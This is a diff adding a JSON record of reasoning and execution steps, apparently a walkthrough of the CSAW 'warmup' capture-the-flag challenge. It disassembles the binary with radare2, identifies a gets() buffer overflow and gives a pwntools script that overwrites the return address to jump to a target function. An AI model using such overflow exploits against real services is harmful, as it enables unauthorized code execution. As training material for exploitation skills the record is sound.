@@ -1,0 +1,18 @@
+[
+    {
+        "type": "thought",
+        "content": "The program says \u201cWOW:\u201d followed by a memory address. This address is probably the address of the function we need to execute. Let\u2019s open radare2 to view the code:"
+    },
+    {
+        "type": "execution",
+        "content": "r2 -A warmup"
+    },
+    {
+        "type": "thought",
+        "content": "This is a classic BOF (Buffer Overflow) case. The main method uses the gets() function to receive the given input and returns it. gets() is storing 64 characters (40h). Because there is no validation of the given string we need to supply an input that will exploit the program and make it jump to the wanted address: 0x40060d.\n\nA short python script will do the job:"
+    },
+    {
+        "type": "execution",
+        "content": "from pwn import *\n\nr = remote('pwn.chal.csaw.io', 8000)\nprint r.recv()\nr.sendline(\"A\"*72 + \"\\x0D\\x06\\x40\\x00\\x00\\x00\\x00\\x00\")\nprint r.recvline()"
+    }
+]
